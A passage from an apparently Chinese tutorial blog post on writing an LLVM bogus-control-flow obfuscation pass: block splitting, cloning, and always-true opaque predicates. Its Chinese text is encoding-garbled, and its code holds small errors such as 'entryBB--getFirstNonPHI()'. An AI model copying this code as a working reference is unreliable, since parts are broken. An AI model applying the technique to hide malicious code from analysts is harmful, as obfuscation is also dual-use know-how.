class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BogusControlFlow::bogus</span><span class="params">(BasicBlock *entryBB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ­¥ï¼Œæ‹†åˆ†å¾—åˆ° entryBB,bodyBB,endBB</span></span><br><span class="line">    <span class="comment">// å…¶ä¸­æ‰€æœ‰çš„ PHI æŒ‡ä»¤éƒ½åœ¨ entryBB(å¦‚æœæœ‰çš„è¯)</span></span><br><span class="line">    <span class="comment">// endBB åªåŒ…å«ä¸€æ¡ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">    BasicBlock *bodyBB = entryBB-&gt;<span class="built_in">splitBasicBlock</span>(entryBB--<span class="built_in">getFirstNonPHI</span>(), <span class="string">&quot;bodyBB&quot;</span>);</span><br><span class="line">    BasicBlock *endBB = bodyBB-&gt;<span class="built_in">splitBasicBlock</span>(bodyBB-&gt;<span class="built_in">getTerminator</span>(), <span class="string">&quot;endBB&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>getFirstNonPHI</code>å‡½æ•°ï¼šè·å–ç¬¬ä¸€æ¡ä¸æ˜¯ PHI æŒ‡ä»¤çš„æŒ‡ä»¤ã€‚</p><h3 id="ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†"><a href="#ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†"></a>ç¬¬äºŒæ­¥ï¼šåŸºæœ¬å—å…‹éš†</h3><p>å…‹éš†ä¸­é—´çš„ <code>bodyBB</code>ï¼Œå¾—åˆ°å…‹éš†å— <code>cloneBB</code>ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220032701809.png" alt="image-20230220032701809"></p><p>LLVM è‡ªå¸¦ <code>CloneBasicBlock</code> å‡½æ•°ï¼Œä½†è¯¥å‡½æ•°ä¸ºä¸å®Œå…¨å…‹éš†ï¼Œè¿˜éœ€è¦åšä¸€äº›è¡¥å……å¤„ç†ã€‚</p><p>æŠŠåŸºæœ¬å—çš„å…‹éš†æ“ä½œå†™åˆ° <code>createCloneBasicBlock</code> å‡½æ•°ä¸­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç¬¬äºŒæ­¥ï¼Œå…‹éš†bodyBB å¾—åˆ°å…‹éš†å—cloneBB</span></span><br><span class="line">BasicBlock *cloneBB = <span class="built_in">createCloneBasicBlock</span>(bodyBB);</span><br></pre></td></tr></table></figure><p><code>CloneBasicBlock</code>å‡½æ•°çš„é—®é¢˜ï¼š</p><p>åœ¨å…‹éš†çš„åŸºæœ¬å—ä¸­ï¼Œä»ç„¶å¼•ç”¨äº†åŸåŸºæœ¬å—ä¸­çš„ <code>%a</code> å˜é‡ï¼Œè¯¥å¼•ç”¨æ˜¯éæ³•çš„ï¼Œæ•…éœ€è¦å°† <code>%a</code> æ˜ å°„ä¸º <code>%a.clone</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orig:</span><br><span class="line">  %a = ...</span><br><span class="line">  %b = fadd %a, ...</span><br><span class="line">  </span><br><span class="line">clone:</span><br><span class="line">  %a.clone = ...</span><br><span class="line">  %b.clone = fadd %a, ... ; Note that this references the old %a and not %a.clone!</span><br></pre></td></tr></table></figure><p>æ ¹æ® VMap å¯¹å…‹éš†åŸºæœ¬å—ä¸­çš„å˜é‡è¿›è¡Œä¿®å¤ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BasicBlock* <span class="title">llvm::createCloneBasicBlock</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ˜ å°„è¡¨ç±»å‹å˜é‡</span></span><br><span class="line">    ValueToValueMapTy VMap;</span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">cloneBasicBlock</span>(BB, VMap, BB-&gt;<span class="built_in">getName</span>() + <span class="string">&quot;cloneBB&quot;</span>, BB-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">    <span class="comment">// å¯¹å…‹éš†åŸºæœ¬å—çš„å¼•ç”¨è¿›è¡Œä¿®å¤</span></span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *cloneBB)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>();i ++)&#123;</span><br><span class="line">            value *V = <span class="built_in">MapValue</span>(I.<span class="built_in">getOperand</span>(i), VMap);</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜ å°„å‡ºæ¥ä¸ä¸ºç©ºï¼Œï¼ˆæˆåŠŸï¼‰</span></span><br><span class="line">            <span class="keyword">if</span>(V)&#123;</span><br><span class="line">                I.<span class="built_in">setOperand</span>(i, V);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cloneBB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cloneBasicBlock</code>å‡½æ•°ï¼šè‡ªå¸¦çš„å…‹éš†åŸºæœ¬å—å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦å…‹éš†çš„åŸºæœ¬å—ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ˜ å°„è¡¨ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºå…‹éš†ååŸºæœ¬å—çš„åç§°ï¼Œç¬¬å››ä¸ªä¸ºå…‹éš†åŸºæœ¬å—æ‰€å±å‡½æ•°ã€‚</p><p><code>getParent</code>æ–¹æ³•ï¼šè¿”å›åŸºæœ¬å—æ‰€å±å‡½æ•°ã€‚</p><p><code>getNumOperands</code>æ–¹æ³•ï¼šè·å–ç»™å®šä¸‹æ ‡çš„æŒ‡ä»¤çš„æ“ä½œæ•°çš„æ•°é‡ã€‚</p><p><code>MapValue</code>å‡½æ•°ï¼šæ˜ å°„å˜é‡ã€‚</p><p><code>getOperand</code>æ–¹æ³•ï¼šè·å–æ“ä½œæ•°ã€‚</p><p><code>setOperand</code>æ–¹æ³•ï¼šæ›¿æ¢æ“ä½œæ•°ã€‚</p><h3 id="ç¬¬ä¸‰æ­¥ï¼šåŸºæœ¬å—å˜å¼‚-amp-amp-æ„é€ è™šå‡è·³è½¬"><a href="#ç¬¬ä¸‰æ­¥ï¼šåŸºæœ¬å—å˜å¼‚-amp-amp-æ„é€ è™šå‡è·³è½¬" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šåŸºæœ¬å—å˜å¼‚ &amp;&amp; æ„é€ è™šå‡è·³è½¬"></a>ç¬¬ä¸‰æ­¥ï¼šåŸºæœ¬å—å˜å¼‚ &amp;&amp; æ„é€ è™šå‡è·³è½¬</h3><p>å°† <code>entryBB</code> åˆ° <code>bodyBB</code> çš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬</p><p>å°† <code>bodyBB</code> åˆ° <code>endBB</code> çš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬</p><p>æ·»åŠ  <code>cloneBB</code> åˆ° <code>bodyBB</code> çš„ç»å¯¹è·³è½¬</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220033827771.png" alt="image-20230220033827771"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬ä¸‰æ­¥ï¼Œæ„é€ è™šå‡è·³è½¬</span></span><br><span class="line"><span class="comment">// 1. å°† entryBB, bodyBB, cloneBB æœ«å°¾çš„ç»å¯¹è·³è½¬ç§»é™¤</span></span><br><span class="line">entryBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">bodyBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">cloneBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line"><span class="comment">// 2. åœ¨ entryBB å’Œ bodyBB çš„æœ«å°¾æ’å…¥æ¡ä»¶ æ’ä¸ºçœŸ çš„è™šå‡æ¯”è¾ƒæŒ‡ä»¤</span></span><br><span class="line">Value *cond1 = <span class="built_in">createBogusCmp</span>(entryBB); </span><br><span class="line">Value *cond2 = <span class="built_in">createBogusCmp</span>(bodyBB); </span><br><span class="line"><span class="comment">// 3. å°† entryBB åˆ° bodyBB çš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬ï¼Œæ¡ä»¶ä¸º cond1ï¼Œä¸ºçœŸè·³è½¬ bodyBBï¼Œä¸ºå‡è·³è½¬ cloneBB</span></span><br><span class="line">BranchInst::<span class="built_in">Create</span>(bodyBB, cloneBB, cond1, entryBB);</span><br><span class="line"><span class="comment">// 4. å°† bodyBB åˆ° endBBçš„ç»å¯¹è·³è½¬æ”¹ä¸ºæ¡ä»¶è·³è½¬ï¼Œæ¡ä»¶ä¸º cond2ï¼Œä¸ºçœŸè·³è½¬ endBBï¼Œä¸ºå‡è·³è½¬ cloneBB</span></span><br><span class="line">BranchInst::<span class="built_in">Create</span>(endBB, cloneBB, cond2, bodyBB);</span><br><span class="line"><span class="comment">// 5. æ·»åŠ  bodyBB.clone åˆ° bodyBB çš„ç»å¯¹è·³è½¬</span></span><br><span class="line">BranchInst::<span class="built_in">Create</span>(bodyBB, cloneBB);</span><br></pre></td></tr></table></figure><p>è¯¥æ¯”è¾ƒæŒ‡ä»¤ç­‰ä»·äº <code>if(y &lt; 10 || x * (x + 1) % 2 == 0)</code>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Value* <span class="title">BogusControlFlow::createBogusCmp</span><span class="params">(BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="comment">// if((y &lt; 10 || x * (x + 1) % 2 == 0))</span></span><br><span class="line">    <span class="comment">// ç­‰ä»·äº if(true)</span></span><br><span class="line">    Module *M = insertAfter-&gt;<span class="built_in">getModule</span>();</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸¤ä¸ªå…¨å±€å˜é‡ xã€y</span></span><br><span class="line">    GlobalVariable *xptr = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(*M, TYPE_I32, <span class="literal">false</span>, GlobalValue::CommonLinkage, <span class="built_in">CONST_I32</span>(<span class="number">0</span>), <span class="string">&quot;x&quot;</span>);</span><br><span class="line">    GlobalVariable *yptr = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(*M, TYPE_I32, <span class="literal">false</span>, GlobalValue::CommonLinkage, <span class="built_in">CONST_I32</span>(<span class="number">0</span>), <span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="comment">// åŠ è½½ä¸¤ä¸ªå…¨å±€å˜é‡</span></span><br><span class="line">    LoadInst *x = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, xptr, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    LoadInst *y = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, yptr, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    <span class="comment">// åˆ›å»º y &lt; 10 å’Œ x * (x + 1) % 2 ä¸¤ä¸ªå¼å­</span></span><br><span class="line">    <span class="comment">// åˆ›å»º y &lt; 10</span></span><br><span class="line">    ICmpInst *cond1 = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, CmpInst::ICMP_SLT, y, <span class="built_in">CONST_I32</span>(<span class="number">10</span>));</span><br><span class="line">    <span class="comment">// åˆ›å»º x * (x + 1) % 2</span></span><br><span class="line">    BinaryOperator *op1 = BinaryOperator::<span class="built_in">CreateAdd</span>(x, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    BinaryOperator *op2 = BinaryOperator::<span class="built_in">CreateMul</span>(op1, x, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    BinaryOperator *op3 = BinaryOperator::<span class="built_in">CreateURem</span>(op2, <span class="built_in">CONST_I32</span>(<span class="number">2</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    ICmpInst *cond2 = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, CmpInst::ICMP_EQ, op3, <span class="built_in">CONST_I32</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> BinaryOperator::<span class="built_in">CreateOr</span>(cond1, cond2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GlobalVariable</code>ï¼šå…¨å±€å˜é‡ç±»å‹ï¼Œå…¶ææ„å‡½æ•°å¯ä»¥ç”¨äºåˆ›å»ºä¸€ä¸ªå…¨å±€å˜é‡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¨¡å—ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å…¨å±€å˜é‡ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°é€‰æ‹©æ˜¯å¦ä¸ºå¸¸é‡ï¼Œç¬¬å››ä¸ªå‚æ•°é€‰æ‹©é“¾æ¥æ–¹å¼ï¼ˆCommonLinkageï¼‰ï¼Œç¬¬äº”ä¸ªå‚æ•°æ˜¯åˆå§‹å€¼ï¼ˆä¸º0ï¼‰ï¼Œç¬¬å…­ä¸ªå‚æ•°ä¸ºåˆ›å»ºå‡ºæ¥çš„å‚æ•°åå­—ã€‚</p><p><code>LoadInst</code>ï¼šè¯»å–æŒ‡ä»¤ï¼Œå…¶ææ„å‡½æ•°å¯ä»¥åˆ›å»ºä¸€æ¡è¯»å–æŒ‡ä»¤ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…¨å±€å˜é‡ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å…¨å±€å˜é‡æŒ‡é’ˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åç§°ï¼Œç¬¬å››ä¸ªå‚æ•°æŒ‡å®šæ’å…¥åˆ°å“ªä¸ªåŸºæœ¬å—ï¼ˆinsertAfterã€‚</p><p><code>ICmpInst</code>ï¼šæ¯”è¾ƒæŒ‡ä»¤ï¼Œå…¶ææ„å‡½æ•°å¯ä»¥åˆ›å»ºä¸€æ¡æ¯”è¾ƒæŒ‡ä»¤ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å®šæ’å…¥åˆ°å“ªä¸ªåŸºæœ¬å—åé¢ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è°“è¯ï¼ŒæŒ‡å®šä¸ºå¤§äºã€å°äºã€æˆ–ç­‰äºï¼ˆCmpInst::ICMP_SLTï¼‰ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å’Œç¬¬å››ä¸ªå‚æ•°åˆ†åˆ«æŒ‡å®šå·¦è¾¹å’Œå³è¾¹çš„å‚æ•°ã€‚</p><p><code>BinaryOperator</code>ï¼šäºŒå…ƒè¿ç®—æŒ‡ä»¤ï¼Œå¯ä»¥åˆ›å»ºåŠ å‡ä¹˜é™¤å’Œä¸æˆ–éç­‰æŒ‡ä»¤ã€‚</p><h1 id="è™šå‡æ§åˆ¶æµä»£ç å®ç°"><a href="#è™šå‡æ§åˆ¶æµä»£ç å®ç°" class="headerlink" title="è™šå‡æ§åˆ¶æµä»£ç å®ç°"></a>è™šå‡æ§åˆ¶æµä»£ç å®ç°</h1><h2 id="BogusControlFlow-cpp"><a href="#BogusControlFlow-cpp" class="headerlink" title="BogusControlFlow.cpp"></a>BogusControlFlow.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/ValueMapper.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Cloning.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;SplitBasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ··æ·†æ¬¡æ•°ï¼Œæ··æ·†æ¬¡æ•°è¶Šå¤šæ··æ·†ç»“æœè¶Šå¤æ‚</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">obfuTimes</span><span class="params">(<span class="string">&quot;bcf_loop&quot;</span>, cl::init(<span class="number">1</span>), cl::desc(<span class="string">&quot;Obfuscate a function &lt;bcf_loop&gt; time(s).&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BogusControlFlow</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">            <span class="built_in">BogusControlFlow</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;</span><br><span class="line">                <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¯¹åŸºæœ¬å— BB è¿›è¡Œæ··æ·†</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">bogus</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºæ¡ä»¶æ’ä¸ºçœŸçš„ ICmpInst*</span></span><br><span class="line">            <span class="comment">// è¯¥æ¯”è¾ƒæŒ‡ä»¤çš„æ¡ä»¶ä¸ºï¼šy &lt; 10 || x * (x + 1) % 2 == 0</span></span><br><span class="line">            <span class="comment">// å…¶ä¸­ x, y ä¸ºæ’ä¸º0çš„å…¨å±€å˜é‡</span></span><br><span class="line">            <span class="function">Value* <span class="title">createBogusCmp</span><span class="params">(BasicBlock *insertAfter)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">BogusControlFlow::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="built_in">INIT_CONTEXT</span>(F);</span><br><span class="line">    FunctionPass *pass = <span class="built_in">createSplitBasicBlockPass</span>();</span><br><span class="line">    pass-&gt;<span class="built_in">runOnFunction</span>(F);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; obfuTimes;i ++)&#123;</span><br><span class="line">        vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">            origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">            <span class="built_in">bogus</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Value* <span class="title">BogusControlFlow::createBogusCmp</span><span class="params">(BasicBlock *insertAfter)</span></span>&#123;</span><br><span class="line">    <span class="comment">// if((y &lt; 10 || x * (x + 1) % 2 == 0))</span></span><br><span class="line">    <span class="comment">// ç­‰ä»·äº if(true)</span></span><br><span class="line">    Module *M = insertAfter-&gt;<span class="built_in">getModule</span>();</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸¤ä¸ªå…¨å±€å˜é‡ xã€y</span></span><br><span class="line">    GlobalVariable *xptr = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(*M, TYPE_I32, <span class="literal">false</span>, GlobalValue::CommonLinkage, <span class="built_in">CONST_I32</span>(<span class="number">0</span>), <span class="string">&quot;x&quot;</span>);</span><br><span class="line">    GlobalVariable *yptr = <span class="keyword">new</span> <span class="built_in">GlobalVariable</span>(*M, TYPE_I32, <span class="literal">false</span>, GlobalValue::CommonLinkage, <span class="built_in">CONST_I32</span>(<span class="number">0</span>), <span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="comment">// åŠ è½½ä¸¤ä¸ªå…¨å±€å˜é‡</span></span><br><span class="line">    LoadInst *x = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, xptr, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    LoadInst *y = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, yptr, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    <span class="comment">// åˆ›å»º y &lt; 10 å’Œ x * (x + 1) % 2 ä¸¤ä¸ªå¼å­</span></span><br><span class="line">    <span class="comment">// åˆ›å»º y &lt; 10</span></span><br><span class="line">    ICmpInst *cond1 = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, CmpInst::ICMP_SLT, y, <span class="built_in">CONST_I32</span>(<span class="number">10</span>));</span><br><span class="line">    <span class="comment">// åˆ›å»º x * (x + 1) % 2</span></span><br><span class="line">    BinaryOperator *op1 = BinaryOperator::<span class="built_in">CreateAdd</span>(x, <span class="built_in">CONST_I32</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    BinaryOperator *op2 = BinaryOperator::<span class="built_in">CreateMul</span>(op1, x, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    BinaryOperator *op3 = BinaryOperator::<span class="built_in">CreateURem</span>(op2, <span class="built_in">CONST_I32</span>(<span class="number">2</span>), <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">    ICmpInst *cond2 = <span class="keyword">new</span> <span class="built_in">ICmpInst</span>(*insertAfter, CmpInst::ICMP_EQ, op3, <span class="built_in">CONST_I32</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> BinaryOperator::<span class="built_in">CreateOr</span>(cond1, cond2, <span class="string">&quot;&quot;</span>, insertAfter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BogusControlFlow::bogus</span><span class="params">(BasicBlock *entryBB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ­¥ï¼Œæ‹†åˆ†å¾—åˆ° entryBB,bodyBB,endBB</span></span><br><span class="line">    <span class="comment">// å…¶ä¸­æ‰€æœ‰çš„ PHI æŒ‡ä»¤éƒ½åœ¨ entryBB(å¦‚æœæœ‰çš„è¯)</span></span><br><span class="line">    <span class="comment">// endBB åªåŒ…å«ä¸€æ¡ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">    BasicBlock *bodyBB = entryBB-&gt;<span class="built_in">splitBasicBlock</span>(entryBB--<span class="built_in">getFirstNonPHI</span>(), <span class="string">&quot;bodyBB&quot;</span>);</span><br><span class="line">    BasicBlock *endBB = bodyBB-&gt;<span class="built_in">splitBasicBlock</span>(bodyBB-&gt;<span class="built_in">getTerminator</span>(), <span class="string">&quot;endBB&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ç¬¬äºŒæ­¥ï¼Œå…‹éš† bodyBB å¾—åˆ°å…‹éš†å— cloneBB</span></span><br><span class="line">    BasicBlock *cloneBB = <span class="built_in">createCloneBasicBlock</span>(bodyBB);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¬¬ä¸‰æ­¥ï¼Œæ„é€ è™šå‡è·³è½¬</span></span><br><span class="line">    <span class="comment">// 1. å°† entryBB, bodyBB, cloneBB æœ«å°¾çš„ç»å¯¹è·³è½¬ç§»é™¤</span></span><br><span class="line">    entryBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    bodyBB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    cloneBB-&gt;<span 